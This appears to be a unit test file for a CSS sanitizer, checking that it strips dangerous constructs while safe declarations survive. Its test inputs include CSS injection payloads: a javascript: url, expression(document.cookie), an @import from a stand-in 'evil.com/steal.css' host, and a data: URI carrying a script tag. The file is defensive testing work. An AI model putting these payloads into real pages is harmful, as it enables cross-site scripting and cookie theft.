import { sanitizeCss } from '../lib/cssValidator';

describe('sanitizeCss', () => {
  it('passes through safe CSS unchanged', () => {
    const css = 'body { color: red; font-size: 14px; }';
    expect(sanitizeCss(css)).toBe(css);
  });

  it('removes javascript: in url()', () => {
    const css = 'body { background: url("javascript:alert(1)"); }';
    expect(sanitizeCss(css)).not.toContain('javascript:');
  });

  it('removes expression()', () => {
    const css = 'div { width: expression(document.cookie); }';
    expect(sanitizeCss(css)).not.toContain('expression(');
  });

  it('removes @import', () => {
    const css = '@import url("https://evil.com/steal.css"); body { color: red; }';
    expect(sanitizeCss(css)).not.toContain('@import');
    expect(sanitizeCss(css)).toContain('body { color: red; }');
  });

  it('removes data: URIs in url()', () => {
    const css = 'body { background: url("data:text/html,<script>alert(1)</script>"); }';
    expect(sanitizeCss(css)).not.toContain('data:');
  });

  it('returns empty string for null/undefined input', () => {
    expect(sanitizeCss(undefined)).toBe('');
    expect(sanitizeCss('')).toBe('');
  });

  it('preserves safe url() with https', () => {
    const css = 'body { background: url("https://example.com/bg.png"); }';
    const result = sanitizeCss(css);
    expect(result).toContain('url("https://example.com/bg.png")');
  });

  it('does not leave dangling characters when url payload contains nested parens', () => {
    const css = 'div { background: url("javascript:alert(1)"); color: red; }';
    const result = sanitizeCss(css);
    expect(result).not.toContain('javascript:');
    // The color declaration after the stripped property must survive
    expect(result).toContain('color: red');
  });

  it('does not leave dangling characters for data: URIs with nested parens', () => {
    const css = 'div { background: url("data:image/svg+xml,fn()"); color: red; }';
    const result = sanitizeCss(css);
    expect(result).not.toContain('data:');
    expect(result).toContain('color: red');
  });
});
